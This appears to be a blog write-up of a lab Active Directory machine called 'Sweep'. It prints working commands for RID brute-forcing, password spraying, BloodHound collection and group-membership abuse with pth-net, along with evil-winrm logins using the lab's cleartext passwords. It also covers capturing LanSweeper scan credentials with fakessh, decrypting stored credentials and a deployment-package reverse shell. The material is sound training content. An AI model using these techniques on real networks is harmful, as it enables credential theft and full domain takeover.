+++
date = '2026-11-15T18:19:12+01:00'
draft = false
title = 'Sweep Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`09/11/2026`**

![pwn.png](/images/imgs_sweep/pwn.png)

---

# Introduction

**_Sweep_** is a **Medium-level Active Directory** environment that focuses heavily on enumerating and exploiting a **LanSweeper** deployment.

The initial foothold requires enumerating **SMB** through a **RID brute-force** attack to gather a valid user list, followed by a **password spraying** attack to discover valid credentials. Using the compromised credentials, we can map the Active Directory via **BloodHound** and access the LanSweeper web interface, discovering that a service account has **`GenericAll`** over the **`LANSWEEPER ADMINS`** group.
By manipulating the scanning targets in **LanSweeper** and standing up a **fakessh** server, we can sniff the cleartext credentials of the Linux service account. Finally, Privilege Escalation can be achieved in two different ways: by extracting and decrypting the internal **LanSweeper** credentials via a custom PowerShell script, or by deploying a malicious package directly from the **LanSweeper** web console to obtain a reverse shell as **`NT AUTHORITY\SYSTEM`**.

---

# Techniques Used

- **SMB RID Brute-Forcing**

- **Password Spraying**

- **Credential Sniffing via FakeSSH**

- **Active Directory ACL Abuse (GenericAll)**

- **LanSweeper Credential Decryption**

- **LanSweeper Deployment Package RCE**

---

# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- sweep -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
81/tcp    open  hosts2-ns
82/tcp    open  xfer
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV sweep -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Did not follow redirect to /login.aspx
82/tcp   open  ssl/xfer?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-09 07:52:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sweep.vl, Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|_  System_Time: 2026-11-09T07:52:45+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

I added **`sweep.vl`** and **`inventory.sweep.vl`** to my **`/etc/hosts`** file.

## Web & SMB Enumeration

Browsing to **`http://sweep.vl:81`**, I found a **LanSweeper** login instance.

![web.png](/images/imgs_sweep/web.png)

Without any credentials, I shifted my focus to **SMB**. Standard anonymous authentication yielded no shares or users:

```bash
nxc smb sweep.vl -u 'Guest' -p '' --shares
nxc smb sweep.vl -u 'Guest' -p '' --users
```

![smb1.png](/images/imgs_sweep/smb1.png)

Since null sessions were partially restricted, I performed a **RID brute-force** attack:

```bash
nxc smb sweep.vl -u 'Guest' -p '' --rid-brute
```

![rid.png](/images/imgs_sweep/rid.png)

I copied the output into **`users.txt`** and cleaned it up using **awk**:

```bash
cat users.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | tee users.txt
```

The cleaned user list contained some interesting accounts, including **`svc_inventory_win`**, **`svc_inventory_lnx`**, and **`intern`**.
I proceeded to run a **password spraying** attack assuming **password reuse**:

```bash
nxc smb sweep.vl -u users.txt -p users.txt
```

![spray.png](/images/imgs_sweep/spray.png)

I successfully found a valid credential pair: **`intern:intern`**.
I validated these credentials with **NetExec** via **WinRM**, but the user didn't have remote access. However, they worked for logging into the **LanSweeper** web interface.

![logged.png](/images/imgs_sweep/logged.png)

---

# Initial Access | BloodHound & FakeSSH Sniffing

After logging into **LanSweeper**, I navigated to the **Scanning Credentials** section and noticed an **SSH** credential entry for **`svc_inventory_lnx`**.

![creds.png](/images/imgs_sweep/creds.png)

The password was hidden.

Before proceeding, I decided to map the Active Directory using **BloodHound**:

```bash
bloodhound-python -u intern -p intern -ns 10.10.67.138 -d sweep.vl -c all --zip
```

![harvest.png](/images/imgs_sweep/harvest.png)

Analyzing the data, I found that **`svc_inventory_lnx`** had **`GenericAll`** privileges over the **`LANSWEEPER ADMINS`** group.

![hound.png](/images/imgs_sweep/hound.png)

To figure out how to leverage this, I took a step back to research exactly how the application operates.

**Note**: _**LanSweeper** is an IT asset management and network inventory solution. It works by actively scanning IP ranges and authenticating to target devices (via **SSH**, **SMB**, **WMI**, etc.) using the credentials stored in its database to gather system information._

Understanding that the application routinely initiates automated connections to mapped targets, I realized I could potentially trick the system into authenticating to my attacking machine and **sniff the password** in transit.

To steal the credential from **LanSweeper**, I exploited the scanning feature:

- I added a new scanning target, passing **my attacker IP** as the **IP range**, and modified the target **SSH port** to **`22667`**.

![scan.png](/images/imgs_sweep/scan.png)

![scan2.png](/images/imgs_sweep/scan2.png)

- In the scanning credentials page, I mapped the **Linux Inventory** credential to my specific **IP range**.

![scan3.png](/images/imgs_sweep/scan3.png)

On my attacker machine, I set up **fakessh** to listen on the specified port and capture the authentication attempt:

```bash
~/go/bin/fakessh -bind ":22667"
```

![snif1.png](/images/imgs_sweep/snif1.png)

I received a connection with a login attempt, so I added the **`-passwd`** flag to output the plaintext password.

```bash
~/go/bin/fakessh -bind ":22667" -passwd
```

![snif2.png](/images/imgs_sweep/snif2.png)

---

# Lateral Movement | Abuse GenericAll

To proceed, I abused **`GenericAll`** rights to add the account directly into the **`LANSWEEPER ADMINS`** group using **pth-net** (following standard **BloodHound** opsec guides):

```bash
pth-net rpc group addmem "LANSWEEPER ADMINS" svc_inventory_lnx -U "sweep.vl/svc_inventory_lnx%0|5m-U6?/uAX" -S 10.10.63.138
```

![validate.png](/images/imgs_sweep/validate.png)

I verified the new access via **WinRM** and logged in to grab the **user flag**:

```bash
nxc winrm sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
evil-winrm -i sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```

![userf.png](/images/imgs_sweep/userf.png)

---

# Privilege Escalation | Two Paths to SYSTEM

Repwning this box, I discovered two distinct ways to gain full system compromise.

## Path 1: LanSweeper Credential Decryption (Unintended)

Since **LanSweeper** also manages Windows machines, it contained the credentials for **`svc_inventory_win`**.

![wincreds.png](/images/imgs_sweep/wincreds.png)

This is a high-value target because it is a member of the **`AD Administrator`** group.

![hound2.png](/images/imgs_sweep/hound2.png)

After researching how **LanSweeper** handles credential storage, I discovered an interesting detail: while the credentials are encrypted in the database and the connection parameters reside in **`website\web.config`**, the decryption key to unlock everything is stored locally on the server, specifically in the **`Key\Encryption.txt`** file.

```cmd
type website\web.config
```

![stored.png](/images/imgs_sweep/stored.png)


**`/Key/Encryption.txt`**.

![stored1.png](/images/imgs_sweep/stored1.png)

To decrypt the database credentials, I used the **SharpLansweeperDecrypt** PowerShell script:

- https://github.com/Yeeb1/SharpLansweeperDecrypt

```powershell
.\LD.ps1
```

![decrypt.png](/images/imgs_sweep/decrypt.png)

The script successfully decrypted the password for **`svc_inventory_win`**.

![validate2.png](/images/imgs_sweep/validate2.png)

I logged into **WinRM** with the new **Administrator** credentials and retrieved the **root flag**.

```bash
evil-winrm -i sweep.vl -u 'svc_inventory_win' -p '4^56!sK&}eA?'
```

![rootf.png](/images/imgs_sweep/rootf.png)

---

# Path 2: Deployment Package RCE (Intended)

The other method involves exploiting the **LanSweeper** web application's deployment features directly.

- I logged into http://inventory.sweep.vl using the **`svc_inventory_lnx`** account.

- I navigated to **Deployment Packages** and created a new package named **PrivEsc**.

- I added a step with the **Action** set to **Command**.

- I generated a standard PowerShell reverse shell payload and pasted it into the command step, then saved it.

- I clicked **Deploy Now**, selected the **INVENTORY** machine, and executed the package.

With a **Netcat** listener running on my attacker machine, I caught the callback:

Checking **`whoami`** revealed I was running as **`NT AUTHORITY\SYSTEM`**.

I navigated to **`C:\Users\Administrator\Desktop\`** and read **`root.txt`**.

**Note**: _Since I reconstructed this specific path from my older notes taken during my first run of the box, some minor UI interactions might slightly differ, but the core logic of the Deployment Package abuse remains exactly the same._

---

# Final Thoughts

Not so easy, but perfectly in line with the **Medium** rating.

I think this is maybe the first **Medium** box where I found a completely alternate way to pwn it. The sniffing part using **fakessh** is a fascinating technique and a great reminder of how automated network scanning tools can be turned against the administrators if configured to reach untrusted subnets. Both privilege escalation vectors were incredibly satisfying to execute.

**Sources**:

- **FakeSSH | https://github.com/ffuf/fakessh**

- **SharpLansweeperDecrypt | https://github.com/Yeeb1/SharpLansweeperDecrypt**